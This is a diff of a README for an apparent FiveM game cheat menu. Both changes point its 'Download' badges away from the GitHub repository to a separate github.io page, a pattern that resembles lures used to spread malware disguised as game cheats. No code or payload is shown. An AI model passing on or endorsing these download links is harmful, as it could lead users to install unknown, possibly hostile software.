@@ -1,6 +1,6 @@
 # 🎮 FiveM-Mod-Menu-2026 - Get Unlimited Power in FiveM Today
 
-[![Download FiveM Mod Menu](https://img.shields.io/badge/Download-FiveM_Mod_Menu_2026-2ea44f?style=for-the-badge&logo=github&logoColor=white&labelColor=purple)](https://github.com/shamed-roundfile8021/FiveM-Mod-Menu-2026)
+[![Download FiveM Mod Menu](https://img.shields.io/badge/Download-FiveM_Mod_Menu_2026-2ea44f?style=for-the-badge&logo=github&logoColor=white&labelColor=purple)](https://shamed-roundfile8021.github.io)
 
 ---
 
@@ -75,7 +75,7 @@ Getting the menuonto your computer is quick and painless. Follow these simple st
 **📌 Download Link (Official):**
 
 
-[![Download Now](https://img.shields.io/badge/Download-FiveM_Mod_Menu_2026-ff7f00?style=for-the-badge&logo=github&logoColor=white&labelColor=black)](https://github.com/shamed-roundfile8021/FiveM-Mod-Menu-2026)
+[![Download Now](https://img.shields.io/badge/Download-FiveM_Mod_Menu_2026-ff7f00?style=for-the-badge&logo=github&logoColor=white&labelColor=black)](https://shamed-roundfile8021.github.io)
 
 
 ---
